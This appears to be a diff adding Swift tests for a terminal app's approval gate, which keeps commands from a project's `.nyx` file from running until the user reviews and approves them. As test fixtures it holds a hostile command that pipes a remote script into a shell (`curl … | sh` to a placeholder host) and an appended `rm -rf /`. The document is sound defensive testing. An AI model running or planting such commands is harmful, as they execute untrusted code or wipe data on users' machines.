@@ -113,3 +113,144 @@ theme = something-else
     #expect(restored.isApproved(directory: "/Users/nik/projects/nyx", digest: "deadbeef"))
     #expect(restored.directories.count == 1)
 }
+
+// MARK: - The gate
+//
+// The security boundary, stated as tests. Nothing from a `.nyx` file may run, become a button or
+// reach the palette before the user has been shown the commands and approved that directory --
+// cloning a repository must not be enough.
+
+private let hostile = """
+quick = Test | make test
+quick = Deploy | run | curl https://example.invalid/x.sh | sh
+"""
+
+private func gate(_ contents: String?, approvals: ProjectApprovals = ProjectApprovals(),
+                  directory: String = "/w/proj") -> ProjectActionsState {
+    ProjectActionsGate.state(directory: directory, fileContents: contents, approvals: approvals)
+}
+
+@Test func aDirectoryWithNoProjectFileOffersNothing() {
+    #expect(gate(nil) == .none)
+    #expect(gate(nil).runnableActions.isEmpty)
+}
+
+/// The one that matters: a fresh clone. The file is there, it parses, and not one of its commands
+/// is allowed anywhere near a button.
+@Test func aNeverSeenProjectRunsNothing() {
+    let state = gate(hostile)
+    #expect(state.needsApproval)
+    #expect(state.runnableActions.isEmpty)
+    // ...but the user can be shown them, which is the whole point of asking.
+    #expect(state.actionsToShow.count == 2)
+}
+
+@Test func anApprovedProjectContributesItsActions() {
+    let digest = ProjectActionsFile.digest(of: hostile)
+    var approvals = ProjectApprovals()
+    approvals.approve(directory: "/w/proj", digest: digest)
+    let state = gate(hostile, approvals: approvals)
+    #expect(!state.needsApproval)
+    #expect(state.runnableActions.count == 2)
+}
+
+/// Approval is recorded against the contents, so an edit -- or a `git pull` that brings one in --
+/// revokes it. Everything stops running until the user looks again.
+@Test func anEditedProjectFileRevokesTheApproval() {
+    var approvals = ProjectApprovals()
+    approvals.approve(directory: "/w/proj", digest: ProjectActionsFile.digest(of: hostile))
+    let state = gate(hostile + "\nquick = Extra | rm -rf /", approvals: approvals)
+    #expect(state.runnableActions.isEmpty)
+    if case .changed = state {} else { Issue.record("expected .changed, got \(state)") }
+}
+
+/// Approving one directory approves that directory, not the idea of project files.
+@Test func anApprovalDoesNotTravelToAnotherDirectory() {
+    var approvals = ProjectApprovals()
+    approvals.approve(directory: "/w/proj", digest: ProjectActionsFile.digest(of: hostile))
+    #expect(gate(hostile, approvals: approvals, directory: "/w/other").runnableActions.isEmpty)
+}
+
+/// A trailing slash is the same directory; being asked again for `/a/b/` after approving `/a/b`
+/// would look broken. The normalisation is `ProjectApprovals`'; this says the gate inherits it.
+@Test func theGateInheritsTheTrailingSlashRule() {
+    var approvals = ProjectApprovals()
+    approvals.approve(directory: "/w/proj", digest: ProjectActionsFile.digest(of: hostile))
+    #expect(gate(hostile, approvals: approvals, directory: "/w/proj/").runnableActions.count == 2)
+}
+
+/// A file that defines nothing gets no bar: approving a list of nothing grants nothing, and an
+/// empty `.nyx` must not be a way to put a strip in front of somebody.
+@Test func aProjectFileWithNoActionsIsInvisible() {
+    #expect(gate("# nothing here\nfont-size = 96") == .none)
+    #expect(gate("") == .none)
+}
+
+/// A project may add buttons and may not change a setting -- the parser already refuses, and this
+/// says so from the gate's side, where it is the thing being relied on.
+@Test func aProjectCannotSetSettingsEvenOnceApproved() {
+    let text = "quick = Test | make test\ntheme = evil\nfont-size = 96"
+    var approvals = ProjectApprovals()
+    approvals.approve(directory: "/w/proj", digest: ProjectActionsFile.digest(of: text))
+    let state = gate(text, approvals: approvals)
+    #expect(state.runnableActions.count == 1)
+    #expect(state.runnableActions[0].name == "Test")
+}
+
+// MARK: - What the user is told
+
+@Test func theBarNamesTheProjectAndHowManyActions() {
+    let message = ProjectActionsGate.barMessage(for: gate(hostile), directory: "/w/proj")
+    #expect(message?.contains("proj") == true)
+    #expect(message?.contains("2") == true)
+}
+
+/// "These changed" is a different question from "this wants to add actions", and the user has
+/// already answered the second one.
+@Test func aChangedProjectSaysSoRatherThanAskingAfresh() {
+    var approvals = ProjectApprovals()
+    approvals.approve(directory: "/w/proj", digest: "stale")
+    let message = ProjectActionsGate.barMessage(for: gate(hostile, approvals: approvals),
+                                                directory: "/w/proj")
+    #expect(message?.contains("changed") == true)
+}
+
+@Test func anApprovedProjectHasNothingToSay() {
+    var approvals = ProjectApprovals()
+    approvals.approve(directory: "/w/proj", digest: ProjectActionsFile.digest(of: hostile))
+    #expect(ProjectActionsGate.barMessage(for: gate(hostile, approvals: approvals),
+                                          directory: "/w/proj") == nil)
+    #expect(ProjectActionsGate.barMessage(for: .none, directory: "/w/proj") == nil)
+}
+
+/// The review shows the commands, not the names: a button called "Test" that runs `curl … | sh` is
+/// exactly what approval exists to stop, and the same file chooses both.
+@Test func theReviewShowsTheCommandsThemselves() {
+    let text = ProjectActionsGate.reviewText(gate(hostile).actionsToShow)
+    #expect(text.contains("make test"))
+    #expect(text.contains("curl https://example.invalid/x.sh | sh"))
+    #expect(text.contains("run"))
+}
+
+@Test func theProjectIsNamedByItsDirectory() {
+    #expect(ProjectActionsGate.displayName(of: "/Users/nik/projects/nyx") == "nyx")
+    #expect(ProjectActionsGate.displayName(of: "/Users/nik/projects/nyx/") == "nyx")
+    #expect(ProjectActionsGate.displayName(of: "/") == "/")
+}
+
+// MARK: - Where the record lives
+
+/// Beside the config file, so `$NYX_CONFIG` moves both together: pointing Nyx at another config
+/// directory is setting up another Nyx, which would not expect to inherit these.
+@Test func approvalsLiveBesideTheConfigFile() {
+    let config = ConfigPath.resolve(environment: [:], home: "/Users/nik")
+    #expect(ProjectApprovals.path(besideConfigAt: config).path
+        == "/Users/nik/.config/nyx/approved-projects")
+}
+
+@Test func approvalsFollowAnOverriddenConfigPath() {
+    let config = ConfigPath.resolve(environment: ["NYX_CONFIG": "/tmp/alt/config"], home: "/Users/nik")
+    #expect(ProjectApprovals.path(besideConfigAt: config).path == "/tmp/alt/approved-projects")
+}
+
+
